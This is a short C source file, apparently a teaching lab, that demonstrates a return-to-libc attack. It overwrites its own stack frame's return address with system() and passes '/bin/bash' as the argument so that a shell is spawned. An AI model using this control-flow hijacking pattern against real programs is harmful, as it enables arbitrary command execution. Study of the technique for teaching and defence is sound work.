#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

extern uint32_t* get_ebp();

void ret2libc(int dummy) {
	/*TASK 1: get the value of ebp. make use of the get_ebp funct*/
	uint32_t *curr_ebp;
	
	curr_ebp = get_ebp();
	
	/*copy original return address of ret2libc*/
	curr_ebp[2] = curr_ebp[1];
	
	/*TASK 2: overwrite written address with address of system*/
	curr_ebp[1] = (uint32_t)&system;
	
	/*TASK 3: set up the argument to system as a pointer to string "/bin/bash"*/
	char *str = "/bin/bash";
	curr_ebp[3] = (uint32_t)str;

}

void ret2libc_generic(char *cmd) {
	/*TASK 1: get the value of ebp. make use of the get_ebp funct*/
	uint32_t *curr_ebp;
	
	curr_ebp = get_ebp();
	
	/*TASK 3: set up the argument to system as a pointer to string "/bin/bash"*/
	curr_ebp[3] = curr_ebp[2];	
	
	/*copy original return address of ret2libc*/
	curr_ebp[2] = curr_ebp[1];
	
	/*TASK 2: overwrite written address with address of system*/
	curr_ebp[1] = (uint32_t)&system;

}


int main() {
	/*ret2libc(0);*/
	ret2libc_generic("/bin/bash");
	printf("Done!\n");
	return 0;
}
